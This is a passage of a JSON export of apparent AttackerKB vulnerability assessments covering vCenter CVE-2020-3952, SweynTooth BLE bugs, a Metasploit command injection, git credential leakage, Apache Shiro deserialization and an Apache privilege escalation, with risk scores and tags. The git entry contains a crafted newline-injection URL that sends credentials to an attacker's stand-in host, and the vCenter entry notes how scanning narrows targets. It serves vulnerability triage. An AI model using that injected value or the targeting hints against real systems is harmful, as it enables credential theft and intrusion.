      "id": "a8bffc50-99a0-4f43-b39a-954acb79afc6",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "85036bc9-e798-46ce-a5b3-43bdcfe83346",
      "created": "2020-04-16T13:25:26.423188Z",
      "revisionDate": "2020-05-11T20:48:50.486884Z",
      "document": "Technical details on the vuln are out: https://www.guardicore.com/2020/04/pwning-vmware-vcenter-cve-2020-3952/. It's quite a bit more than information disclosure. Full auth bypass and the ability to add an arbitrary admin user. I've confirmed it myself and added a second [module](https://github.com/rapid7/metasploit-framework/pull/13253).\r\n\r\nETA: I noted the following in an earlier response here:\r\n\r\n> The data seemed to contain secrets related to VMware\u2019s Security Token Service (STS) for single sign-on (SSO).\r\n\r\nSo information disclosure is still on the table for obtaining access. Presumably, you would use the STS private key to sign forged SAML tokens used in the STS SSO system. Wanted to update AKB, since we'd been talking about it in work Slack. :)\r\n\r\nHats off to the Guardicore team for their dedicated analysis.",
      "score": 10,
      "metadata": {},
      "tags": []
    },
    {
      "id": "e9946464-0572-49d5-a7fd-08c7f4fca39d",
      "editorId": "243049a2-c85d-4432-a0ed-bb155a19a006",
      "topicId": "131226a6-a1e9-48a1-a5d0-ac94baf8dfd2",
      "created": "2020-04-16T14:00:29.190928Z",
      "revisionDate": "2020-04-18T03:25:22.896726Z",
      "document": "Some of the gotchas on patching this vuln: \r\n - Not restarting the vulnerable asset, even after you apply the patch, keeps the asset vulnerable. Must restart.\r\n - There have been cases where even with the patch reported as being installed, files on disk were vulnerable, manually checking termdd.sys, the file is normally located at C:\\Windows\\System32\\drivers and the version retrieved with this powershell command:\r\n\r\nget-item -Path 'C:\\Windows\\System32\\drivers\\termdd.sys' | Format-List -Force\r\n",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise",
          "pre_auth"
        ]
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "2c5eccbb-99e4-48a5-9aff-1d728f89f241",
      "editorId": "8161de0b-582f-4526-b380-331dc7475a2d",
      "topicId": "85036bc9-e798-46ce-a5b3-43bdcfe83346",
      "created": "2020-04-16T14:20:16.37608Z",
      "revisionDate": "2020-04-18T19:52:12.270064Z",
      "document": "[CVSS 10](https://www.vmware.com/security/advisories/VMSA-2020-0006.html) according to vendor\r\n[Technical details shared by Guardicore](https://www.guardicore.com/2020/04/pwning-vmware-vcenter-cve-2020-3952/) : from unauthenticated to admin (via LDAP). Implemented in a [public exploit](https://github.com/guardicore/vmware_vcenter_cve_2020_3952)\r\nMSF module to come.",
      "score": 6,
      "metadata": {
        "tags": [
          "common_enterprise",
          "high_privilege_access",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "d1101a94-075f-4299-8aef-061279caff9d",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "7572fc0f-2ca4-4e72-a202-d9206e235cc3",
      "created": "2020-04-16T14:28:32.170582Z",
      "revisionDate": "2020-04-26T22:59:45.681592Z",
      "document": "This vuln is part of a related batch named **SweynTooth** from researchers at the Singapore University of Technology and Design.  The SweynTooth vulnerabilities lie within certain Bluetooth Low Energy (BLE) SDKs for Systems-on-a-Chip (SoC), which can make proliferating fixes to affected devices in the field a slow going.\r\n\r\nVulnerable devices need only to be within BLE radio range for an attacker to target.  An exploit can trigger a buffer overflow (BOF) to crash a vulnerable target, effectively a DoS.  Because the attack vector is a BOF, the possibility does exist for a carefully constructed attack to bypass security by overwriting the security nonce and then leak user information.  A detailed explanation can be found [here](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-180006.9) in the original disclosure, as well as some potentially vulnerable devices in [this list](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-5002r4).  It appears the SoC manufacturer has [issued fixes](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-6001r5) for their vulnerable SDK(s).\r\n\r\nEDIT: Attacker Value for this item largely depends on the type of device the vulnerable target is and behavior the device exhibits when successfully exploited.",
      "score": 3,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "difficult_to_patch",
          "default_configuration",
          "pre_auth",
          "no_useful_data"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "8545c126-cfc5-48cb-a988-32d1bcc7bdbe",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "25ff4c1b-6e8c-49c0-acfa-b90606c9c6ad",
      "created": "2020-04-16T14:58:23.208722Z",
      "revisionDate": "2020-04-26T22:59:56.108637Z",
      "document": "This vuln is part of a related batch named **SweynTooth** from researchers at the Singapore University of Technology and Design.  The SweynTooth vulnerabilities lie within certain Bluetooth Low Energy (BLE) SDKs for Systems-on-a-Chip (SoC), which can make proliferating fixes to affected devices in the field a slow going.\r\n\r\nVulnerable devices need to be within BLE radio range *and* have \"secure connection pairing\" enabled in order for an attacker to target.  A successful exploit will achieve a working connection without doing the full \"secure connection pairing\" process, allowing an attacker control over the BLE application's communications.  A detailed explanation can be found [here](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-190006.10) in the original disclosure, as well as some potentially vulnerable devices in [this list](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-5002r4).  It appears the SoC manufacturer has [issued fixes](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-6001r5) for their vulnerable SDK(s).\r\n\r\nEDIT: Attacker Value for this item largely depends on the type of device the vulnerable target is and behavior the device exhibits when successfully exploited.",
      "score": 4,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "d143fda9-8997-49c0-bc52-fe2aa7d02408",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "a0dedc2b-40b1-4579-94ec-bf546228ee7d",
      "created": "2020-04-16T16:12:28.20674Z",
      "revisionDate": "2020-04-26T23:00:08.89857Z",
      "document": "This vuln is part of a related batch named **SweynTooth** from researchers at the Singapore University of Technology and Design.  The SweynTooth vulnerabilities lie within certain Bluetooth Low Energy (BLE) SDKs for Systems-on-a-Chip (SoC), which can make proliferating fixes to affected devices in the field a slow going.\r\n\r\nVulnerable devices need to be within BLE radio range in order for an attacker to target.  A successful exploit will crash the target by sending a \"too short\" link layer PDU.  That said, the watchdog mechanism (enabled by default in the SDK) will notice and reboot the device, making this a short-lived Denial of Service for devices which have the watchdog enabled.  A detailed explanation can be found [here](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-170006.8) in the original disclosure, as well as some potentially vulnerable devices in [this list](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-5002r4).  It appears the SoC manufacturer is still [working on fixes](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-6001r5) for their vulnerable SDK(s).\r\n\r\nEDIT: Attacker Value for this item largely depends on the type of device the vulnerable target is and behavior the device exhibits when successfully exploited.",
      "score": 2,
      "metadata": {
        "tags": [
          "pre_auth",
          "default_configuration",
          "difficult_to_patch",
          "easy_to_develop",
          "no_useful_data"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "17199d06-9fd6-4ab0-81b3-9a28f171ac99",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "a45a7ce0-a7ba-4790-a9c9-20f273997521",
      "created": "2020-04-16T17:02:18.617143Z",
      "revisionDate": "2020-04-26T23:00:19.958133Z",
      "document": "This vuln is part of a related batch named **SweynTooth** from researchers at the Singapore University of Technology and Design.  The SweynTooth vulnerabilities lie within certain Bluetooth Low Energy (BLE) SDKs for Systems-on-a-Chip (SoC), which can make proliferating fixes to affected devices in the field a slow going.\r\n\r\nVulnerable devices need to be within BLE radio range in order for an attacker to target.  A successful exploit will crash the target by sending a Secure Manager Protocol (SMP) public key packet prior to the actual start of the SMP paring process, crashing (and possibly restarting) the target.  In their testing, researchers were able to crash (and deadlock) a [CubiTag device](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-4002r2) containing this vulnerability.  A detailed explanation can be found [here](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-150006.6) in the original disclosure, as well as some potentially vulnerable devices in [this list](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-4001r3).  It appears the SoC manufacturer has [issued fixes](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-6001r5) for their vulnerable SDK(s).\r\n\r\nEDIT: Attacker Value for this item largely depends on the type of device the vulnerable target is and behavior the device exhibits when successfully exploited.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "difficult_to_patch",
          "no_useful_data",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "6d133efe-556b-4e93-9602-fc5751e3f875",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "885cc89a-28a8-4df6-95b0-121a413f1120",
      "created": "2020-04-16T21:28:25.381967Z",
      "revisionDate": "2020-04-16T21:36:54.552813Z",
      "document": "The Metasploit Framework's `libnotify` plugin contains a vulnerability which can allow an attacker to execute an operating system command as the user running Metasploit. Exploiting the vulnerability requires the target user to have the `libnotify` plugin loaded, and then to load a malicious file using `msfconsole`'s `db_import` command.\r\n\r\nThe root of the problem is the way in which arguments are passed to Ruby's `system` function to execute the operating system command. A maliciously crafted service name can add additional arguments and commands to this call, leading to code execution. The vulnerable code path will only be hit the first time the service is reported, i.e. repeatedly loading the malicious file with `db_import` will not result in the command being executed multiple times unless the user deletes the service between attempts.\r\n\r\nThis vulnerability was patched in [https://github.com/rapid7/metasploit-framework/pull/13266](https://github.com/rapid7/metasploit-framework/pull/13266).",
      "score": 1,
      "metadata": {
        "tags": [
          "pre_auth",
          "requires_interaction",
          "easy_to_develop"
        ],
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "5230ab43-9a56-4149-8bb2-6e7a4f730b7f",
      "editorId": "1dd3e3f2-ce25-490c-a995-f31af9faa294",
      "topicId": "a262c213-4d35-4c7d-a07f-975ec8c68878",
      "created": "2020-04-17T04:37:51.604618Z",
      "revisionDate": "2020-04-29T19:53:01.297827Z",
      "document": "### The exploitability is very easy\r\n\r\nThis vuln is just a CRLF injection in my opinion. \r\n\r\nYou could offer the URL like `https://one.example.com?%0ahost=two.example.com/` so that the credential would be sent to `two.example.com` which the attacker owns. \r\n\r\n### The value is limited\r\n\r\nI guess there are some prerequisites for attack :\r\n\r\n- A  subdomain name, has the same main domain name as the target.\r\n\r\n- The victim store or caches the credentials (It's not the default behavior).\r\n\r\n- May need user interactions. The exploit usually occurred when the user runs `git clone <URL>`.\r\n\r\nThat's why I prefer the value for the attacker is `low`.\r\n\r\n### Another  interesting scenario\r\n\r\nThis vuln probably affected the App and service based on `git`, like `GitLab`(Not include `GitLab`).\r\n\r\nThese services may allow users to import or remote clone some repo, this vuln would occur. \r\n\r\n\r\n### Original patch \r\n\r\nhttps://github.com/git/git/commit/9a6bbee8006c24b46a85d29e7b38cfa79e9ab21b\r\n\r\n### Fix and walkaround\r\nSee https://github.com/git/git/security/advisories/GHSA-qm7j-c969-7j4q\r\n\r\n\r\nBeen my first comment in this awesome attackerkb community, welcome to discuss and helpful advice.\r\n",
      "score": 6,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "requires_interaction",
          "obscure_configuration"
        ],
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "8ecf9174-11bf-4ba7-96e1-665361c9073e",
      "editorId": "44f0b559-3dbf-45aa-9d4a-5d3cc7fca8b6",
      "topicId": "33fb495e-9243-4d86-8ad0-0edcb3c11224",
      "created": "2020-04-17T12:15:47.968055Z",
      "revisionDate": "2020-05-05T12:17:44.734247Z",
      "document": "# \u5206\u6790\r\n*  Shiro\u7ec4\u4ef6\u5bf9\u8bb0\u4f4f\u6211(rememberMe)\u529f\u80fd\u7684cookie\u5728CookieRememberMeManaer\u7c7b\u4e2d\u5c06cookie\u4e2drememberMe\u5b57\u6bb5\u5185\u5bb9\u5206\u522b\u8fdb\u884c \u5e8f\u5217\u5316\u3001AES\u52a0\u5bc6\u3001Base64\u7f16\u7801\u64cd\u4f5c\u3002\uff0c\u7136\u540e\u7528\u6237\u5728\u8bf7\u6c42\u7f51\u7ad9\u65f6\uff0cshiro\u53c8\u4f1a\u5728\u8bc6\u522b\u8eab\u4efd\u7684\u65f6\u5019\uff0c\u5bf9Cookie\u91cc\u7684rememberMe\u5b57\u6bb5\u89e3\u5bc6\u3002\r\n\r\n* \u800c\u6839\u636e\u52a0\u5bc6\u7684\u987a\u5e8f\uff0c\u76f8\u7b49\u4e8e\u77e5\u9053\u89e3\u5bc6\u7684\u987a\u5e8f\uff0c\u5e76\u4e14AES\u52a0\u5bc6\u7684\u5bc6\u94a5Key\u88ab\u786c\u7f16\u7801\u5728\u4ee3\u7801\u91cc\uff0c\u540c\u65f6\u5927\u90e8\u5206\u7a0b\u5e8f\u5458\u5728\u4f7f\u7528github\u4e0a\u63d0\u4f9b\u7684\u7a0b\u5e8f\u65f6\u548cshiro\u7ec4\u4ef6\u65f6\u5e76\u672a\u66f4\u6362Key\uff0c\u5bfc\u81f4\u6bcf\u4e2a\u4eba\u90fd\u53ef\u4ee5\u6536\u96c6Key\u6765\u904d\u5386\u76ee\u6807\u7cfb\u7edf\u6240\u4f7f\u7528\u7684\u5bc6\u94a5\uff0c\u6700\u7ec8\u5bfc\u81f4\u4e86\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\r\n\r\n* \u6f0f\u6d1e\u76f8\u5173\u6982\u5ff5\u5df2\u7ecf\u516c\u5f00\uff0c\u4e14\u5b58\u5728\u7740\u516c\u5f00\u7684POC(https://github.com/sv3nbeast/ShiroScan) \uff0c\u65e0\u8bba\u662f\u5728\u516c\u7f51\u8fd8\u662f\u5185\u7f51\u5b58\u5728\u6b64\u7ec4\u4ef6\u7684\u76f8\u5173\u7cfb\u7edf\u6570\u91cf\u4f17\u591a\uff0c\u53c8\u7531\u4e8e\u5c5e\u4e8e\u5386\u53f2\u6f0f\u6d1e\uff0c\u5f53\u521d\u8fdb\u884c\u4fee\u590d\u7684\u8986\u76d6\u9762\u5e76\u4e0d\u5e7f\uff0c\u6240\u4ee5\u6211\u8ba4\u4e3a\u4ed6\u662f\u4e00\u4e2a\u88ab\u4f4e\u4f30\u7684RCE\u6f0f\u6d1e",
      "score": 7,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "pre_auth",
          "common_enterprise"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "e208adbf-4248-4b93-abe5-a5a48c7f520e",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "3275a6e3-042f-4ee9-bc7b-92ffe4191b17",
      "created": "2020-04-17T22:28:32.700444Z",
      "revisionDate": "2020-04-18T20:34:38.989132Z",
      "document": "A vulnerability in Apache server versions 2.4.17\u20132.4.38 caused by an out-of-bounds array access can lead to an arbitrary function call. An attacker can trigger this to execute code in the context of the parent Apache process which often runs as root. In order for the exploit to trigger however, the Apache process must gracefully restart. This can be done on demand using `apache2ctl graceful`, but is also done automatically once at day by the `logrotate` utility (according to [the original disclosure](https://dl.packetstormsecurity.net/1904-exploits/cfreal.pdf)).\r\n\r\nThis exploit is a Local Privilege Escalation (LPE) vulnerability, so an attacker would already need to have some control on the system. This likely could be achieved through some kind of application vulnerability depending on what the Apache server is running.",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "high_privilege_access",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "47e7d075-7f2c-4f80-b87d-8b953db1de03",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "dca304f1-bfa4-4316-9c79-93916537ecfa",
      "created": "2020-04-18T08:22:05.726235Z",
      "revisionDate": "2020-04-19T03:03:28.041686Z",
      "document": "I came across this in a twitter thread [here](https://twitter.com/LargeCardinal/status/1251417908389052416) which highlights that, while it is true that many devices can be reverse engineered / cracked / taken apart / reprogrammed, etc. that in itself is not a vulnerability, it's a feature! Simply having a debug port available inside of a consumer device is not any different than having an OBD-II port in a car. That's what it's there for. Having such a connection does make it easier to find more impactful attack vectors, lowering the barrier for security researchers to find other issues. You _want_ folks to find bugs in your backend, certificate pinning, update protocol, etc.\r\n\r\nIn a related example, the smart toy mentioned in [these advisories](https://blog.rapid7.com/2016/02/02/security-vulnerabilities-within-fisher-price-smart-toy-hereo-gps-platform/) also had a root-shell enabled if you cut the stuffed animal apart and plug into the USB port on the circuit board. But the real interesting stuff was in the API gateway being remotely hijackable due to poor validation.\r\n",
      "score": 3,
      "metadata": {
        "tags": [
          "requires_interaction",
          "difficult_to_exploit",
          "difficult_to_develop"
        ],
        "attacker-value": 1,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "f3eee221-e8a5-4c5c-817a-d4395a0b70e0",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "85036bc9-e798-46ce-a5b3-43bdcfe83346",
      "created": "2020-04-18T11:49:53.327798Z",
      "revisionDate": "2020-04-18T20:33:06.950086Z",
      "document": "Previous tech analyses cover this quite well, but my mind is literally broken trying to figure out how:\r\n\r\n- A bug in a function named VmDirLegacyAccessCheck which causes it to return \u201caccess granted\u201d when permissions checks fail.\r\n- A security design flaw which grants root privileges to an LDAP session with no token, under the assumption that it is an internal operation.\r\n\r\nmade it past any semblance of code review. \r\n\r\nRegardless of ^^, this is a bit worse since attackers can also be a bit less noisy. \r\n\r\nOur LDAP Sonar studies do no attempt at auth and we get `SearchResultEntry$PartialAttributes$vmwPlatformServicesControllerVersion` from the search results query we perform, so it'll be super easy for anyone to only target 6.7.0 systems. There are under 1,000 6.7.0 systems hanging off the internet on 389.\r\n\r\n`recog` also pulls the version out directly if anyone is using that to post-process LDAP responses.",
      "score": 6,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "pre_auth",
          "common_enterprise",
          "default_configuration"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "8d08535a-4ef0-4831-b8b7-e0db210550b9",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "635fd3a8-3341-441b-816c-4fe3ba204d6d",
      "created": "2020-04-18T19:50:17.96144Z",
      "revisionDate": "2020-04-26T23:00:30.070275Z",
      "document": "This vuln is part of a related batch named **SweynTooth** from researchers at the Singapore University of Technology and Design.  The SweynTooth vulnerabilities lie within certain Bluetooth Low Energy (BLE) SDKs for Systems-on-a-Chip (SoC), which can make proliferating fixes to affected devices in the field a slow going.\r\n\r\nVulnerable devices need to be within BLE radio range in order for an attacker to target.  A successful exploit will leave the target in a deadlocked or non-functional state by sending the target a Link Layer ID packet with a value of 0.  Device recovery may require a hard reset or powercycle, and a vulnerable device will immediately become vulnerable again once it enables BLE.  In their testing, researchers were able to crash a [FitBit Inspire device](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-4002r2) containing this vulnerability, which resulted in a period of ~30 where the Inspire ceased its Bluetooth advertising packets and then restarted itself.  A detailed explanation can be found [here](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-110006.2) in the original disclosure, as well as some potentially vulnerable devices in [this list](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-5002r4).  It appears the SoC manufacturer has [issued fixes](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-6001r5) for their vulnerable SDK(s).\r\n\r\nRelated, the same researchers found an SoC from NXP which also contained a similar vulnerability ([CVE-2019-17060](https://attackerkb.com/topics/Ee1gtEvvn0/cve-2019-17060)), also disclosed as part of SweynTooth.\r\n\r\nEDIT: Attacker Value for this item largely depends on the type of device the vulnerable target is and behavior the device exhibits when successfully exploited.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "difficult_to_patch",
          "no_useful_data",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
